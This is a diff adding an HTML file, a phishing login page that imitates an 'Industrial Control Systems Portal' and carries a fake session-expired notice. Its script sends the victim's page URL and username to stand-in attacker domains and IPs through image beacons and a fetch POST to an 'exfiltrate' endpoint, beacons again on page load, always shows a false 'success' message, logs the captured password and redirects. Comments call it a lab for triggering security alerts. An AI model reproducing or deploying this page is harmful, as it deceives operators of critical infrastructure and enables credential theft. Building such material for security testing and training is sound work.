@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Industrial Control Systems Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #856404;
+        }
+
+        .alert strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .checkbox-group {
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            font-weight: normal;
+            cursor: pointer;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
+        }
+
+        #status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 6px;
+            display: none;
+            font-size: 14px;
+        }
+
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo"></div>
+            <h1>ICS Portal Login</h1>
+            <p>Industrial Control Systems Management</p>
+        </div>
+
+        <div class="content">
+            <div class="alert">
+                <strong>[!] Security Notice</strong>
+                Your session has expired due to inactivity. Please re-authenticate to continue.
+            </div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your username" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+
+                <div class="checkbox-group">
+                    <label>
+                        <input type="checkbox" name="remember" id="remember">
+                        <span>Remember me for 30 days</span>
+                    </label>
+                </div>
+
+                <button type="submit">Sign In</button>
+
+                <div id="status"></div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>Secured by Advanced Threat Protection</p>
+            <p><a href="#">Forgot Password?</a> | <a href="#">Contact Support</a></p>
+            <p style="margin-top: 10px;">© 2024 Industrial Systems Inc. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Malicious domain beacon - triggers URL filtering/DNS security alerts
+        function beaconToMaliciousDomain() {
+            // Known malicious test domains that should trigger security alerts
+            const maliciousDomains = [
+                'http://malware-test-domain.com/beacon',
+                'http://evil-c2-server.net/callback',
+                'http://phishing-kit-download.org/payload'
+            ];
+
+            // Known malicious IPs for testing
+            const maliciousIPs = [
+                'http://192.0.2.1/beacon',  // TEST-NET-1
+                'http://198.51.100.1/callback'  // TEST-NET-2
+            ];
+
+            // Attempt to contact malicious domain (will be blocked by security products)
+            maliciousDomains.forEach(domain => {
+                const img = new Image();
+                img.src = domain + '?victim=' + encodeURIComponent(window.location.href) +
+                         '&user=' + encodeURIComponent(document.getElementById('username').value) +
+                         '&timestamp=' + new Date().getTime();
+                // This will fail but will generate security alerts
+            });
+
+            // Also try fetch API (triggers different security signatures)
+            fetch('http://evil-phishing-site.com/exfiltrate', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: document.getElementById('username').value,
+                    timestamp: new Date().toISOString(),
+                    source: 'ics_portal'
+                })
+            }).catch(err => {
+                // Expected to fail - security products should block
+                console.log('Security blocking successful');
+            });
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+
+            const statusDiv = document.getElementById('status');
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Show processing message
+            statusDiv.textContent = 'Authenticating...';
+            statusDiv.className = '';
+            statusDiv.style.display = 'block';
+
+            // Send beacon to malicious domain (will trigger alerts)
+            beaconToMaliciousDomain();
+
+            // Simulate authentication delay
+            setTimeout(() => {
+                // Always show "success" to not alert the user
+                statusDiv.textContent = '[+] Authentication successful! Redirecting...';
+                statusDiv.className = 'success';
+
+                // In a real phishing attack, credentials would be exfiltrated here
+                // For this lab, we just log them locally
+                console.log('Captured credentials:', { username, password });
+
+                // After 2 seconds, redirect to a legitimate site
+                setTimeout(() => {
+                    // Redirect to actual ICS portal or generic page
+                    window.location.href = 'http://192.168.1.55';
+                }, 2000);
+            }, 1500);
+
+            return false;
+        }
+
+        // Trigger beacon when page loads (generates initial alert)
+        window.addEventListener('load', function() {
+            // Wait 1 second then beacon
+            setTimeout(() => {
+                const img = new Image();
+                img.src = 'http://known-malware-domain.com/track.gif?page=load&ts=' + new Date().getTime();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
